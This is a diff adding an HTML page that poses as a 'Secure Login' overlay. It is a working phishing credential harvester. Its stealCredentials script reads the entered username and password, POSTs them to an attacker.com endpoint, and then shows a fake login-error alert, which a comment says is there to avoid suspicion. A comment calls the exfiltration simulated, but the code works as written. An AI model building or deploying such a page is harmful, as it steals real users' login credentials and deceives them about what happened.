@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Login</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden;
+        }
+        #overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: white;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        input, button {
+            margin: 10px;
+            padding: 10px;
+            font-size: 16px;
+            width: 80%;
+            max-width: 300px;
+        }
+        .warning {
+            color: red;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<div id="overlay">
+    <h2>🔒 Secure Login</h2>
+    <input type="text" id="username" placeholder="Username"><br>
+    <input type="password" id="password" placeholder="Password"><br>
+    <button onclick="stealCredentials()">Login</button>
+    <p class="warning">Don't get spoofed! 🚨</p>
+</div>
+
+<script>
+function stealCredentials() {
+    let user = document.getElementById('username').value;
+    let pass = document.getElementById('password').value;
+
+    // Simulate sending stolen data to an attacker-controlled server
+    fetch("https://attacker.com/steal", {
+        method: "POST",
+        body: JSON.stringify({ username: user, password: pass }),
+        headers: { "Content-Type": "application/json" }
+    });
+
+    alert("Error: Incorrect username or password."); // Fake error to avoid suspicion
+}
+</script>
+
+</body>
+</html>
